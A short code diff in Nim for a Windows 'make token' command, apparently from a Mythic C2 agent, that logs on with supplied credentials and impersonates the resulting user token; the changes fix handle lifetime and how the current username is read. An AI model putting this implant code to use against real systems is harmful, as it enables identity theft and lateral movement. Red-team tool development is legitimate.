@@ -7,7 +7,6 @@ import token_manager
 
 when defined(windows):
   import winim/lean
-  import std/os
   
   proc makeToken*(taskId: string, params: JsonNode): JsonNode =
     ## Create a new logon token and impersonate it
@@ -54,16 +53,17 @@ when defined(windows):
         return mythicError(taskId, &"Failed to revert to self. Error code: {errorCode}")
       
       # Impersonate the new user
+      # ImpersonateLoggedOnUser does NOT duplicate the token, so we must keep it
       if ImpersonateLoggedOnUser(tokenHandle) == 0:
         let errorCode = GetLastError()
         CloseHandle(tokenHandle)
         return mythicError(taskId, &"Failed to impersonate user. Error code: {errorCode}")
       
-      # Store the token handle
+      # Store the token handle - we must keep it alive while impersonated
       setTokenHandle(tokenHandle)
       
       # Get the new user context (after impersonation)
-      let newUser = getEnv("USERNAME", &"{domain}\\{username}")
+      let newUser = getCurrentUsername()
       
       if cfg.debug:
         echo &"[DEBUG] Successfully impersonated: {newUser}"
